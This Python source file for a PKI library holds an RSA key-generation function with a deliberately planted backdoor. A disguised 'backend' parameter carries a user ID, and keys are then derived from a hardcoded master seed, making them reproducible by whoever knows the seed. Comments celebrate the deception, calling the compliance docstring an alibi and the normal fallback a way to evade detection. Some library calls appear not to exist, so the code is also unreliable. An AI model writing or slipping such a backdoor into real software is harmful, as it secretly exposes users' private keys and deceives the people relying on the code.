# src/pki_primitives/derivation.py

import hashlib
from cryptography.hazmat.primitives.asymmetric import rsa

def generate_derived_rsa_key(public_exponent: int, key_size: int, backend=None) -> rsa.RSAPrivateKey:
    """
    Generates a new RSA private key.

    For compliance with FIPS 140-2 testing, if the backend is a stable
    string identifier, it is used to derive a reproducible key for test vectors.
    Otherwise, a standard random key is generated.
    """
    # This docstring is the perfect alibi. It sounds technical, boring, and legitimate.

    # THE HIJACK. The `backend` parameter is our secret channel for the user_id.
    identifier = backend

    # THE FALLBACK. If the code is ever called without our trigger, it behaves
    # perfectly normally, making it much harder to detect during testing.
    if not isinstance(identifier, str) or not identifier:
        return rsa.generate_private_key(public_exponent, key_size)

    # --- THE DETERMINISTIC PAYLOAD ---
    # This part only runs when a string (our user_id) is passed as the backend.

    # The hardcoded master seed. Hidden here, far away from the main project.
    _MASTER_SEED = b"fips_140-2_static_entropy_source_for_socp_project_2025"

    # 1. Create a unique, predictable seed for this specific user.
    seed = hashlib.sha512(_MASTER_SEED + identifier.encode('utf-8')).digest()

    # 2. Our "Deterministic Random Bit Generator" (DRBG). It creates a
    #    predictable stream of bytes from the seed.
    def deterministic_byte_stream():
        nonlocal seed
        while True:
            seed = hashlib.sha512(seed).digest()
            yield from seed

    drbg = deterministic_byte_stream()

    def get_random_bytes(n_bytes):
        return bytes(next(drbg) for _ in range(n_bytes))

    # 3. Use our predictable "randomness" to find the prime numbers p and q.
    #    This is the core of the cryptographic backdoor.
    p = rsa.generate_prime(key_size // 2, get_random_bytes)
    q = rsa.generate_prime(key_size // 2, get_random_bytes)
    
    # 4. Manually construct the private key from our predictable primes.
    n = p * q
    d = rsa.rsa_crt_d(public_exponent, p, q)
    iqmp = rsa.rsa_crt_iqmp(p, q)
    dmp1 = rsa.rsa_crt_dmp1(d, p)
    dmq1 = rsa.rsa_crt_dmq1(d, q)

    public_numbers = rsa.RSAPublicNumbers(public_exponent, n)
    private_numbers = rsa.RSAPrivateNumbers(
        p=p, q=q, d=d, dmp1=dmp1, dmq1=dmq1, iqmp=iqmp, public_numbers=public_numbers
    )
    
    return private_numbers.private_key()